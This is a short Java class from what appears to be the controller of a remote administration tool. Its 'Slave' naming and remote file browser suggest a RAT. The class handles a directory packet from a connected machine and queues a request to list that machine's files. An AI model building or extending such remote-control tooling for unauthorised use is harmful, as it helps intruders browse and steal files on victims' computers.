package com.redpois0n.packets;


import com.redpois0n.Slave;
import com.redpois0n.ui.frames.FrameRemoteFiles;

public class PacketDIR extends Packet {

	@Override
	public void read(Slave slave, String line) throws Exception {
		String where = slave.readLine().replace("/", slave.getFileSeparator()).replace("\\", slave.getFileSeparator());

		FrameRemoteFiles frame = FrameRemoteFiles.instances.get(slave);
		if (frame != null) {
			frame.txtDir.setText(where);
			while (frame.model.getRowCount() > 0) {
				frame.model.removeRow(0);
			}
			slave.addToSendQueue(new PacketBuilder(Header.LIST_FILES, where ));
		}
	}

}
